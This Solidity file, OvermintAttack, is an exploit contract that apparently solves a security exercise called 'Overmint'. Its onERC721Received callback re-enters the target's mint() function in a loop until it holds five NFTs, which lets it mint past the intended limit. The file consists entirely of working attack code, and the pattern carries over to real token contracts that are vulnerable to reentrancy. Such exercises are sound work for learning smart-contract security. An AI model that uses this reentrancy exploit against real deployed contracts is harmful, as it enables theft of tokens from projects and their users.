// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;
import "openzeppelin-contracts/utils/Address.sol";
import "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

import "./Overmint.sol";

contract OvermintAttack is IERC721Receiver {

    Overmint public overmint;
  
    constructor(address _overmint) {
        overmint = Overmint(_overmint);
    }

    function attack() external {

        // initially call the mint function
        overmint.mint();

        // assert that the attack was successful
        require(overmint.success(address(this)), "reentrancy attack failed");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {

        uint256 attackBalance = overmint.balanceOf(address(this));

        while (attackBalance < 5) {

            // re-enter the mint contract
            overmint.mint();

            // update the attack balance to know when to pull out of the loop
            attackBalance = overmint.balanceOf(address(this));
        }

        return this.onERC721Received.selector;
    }

    fallback() external {

    }
}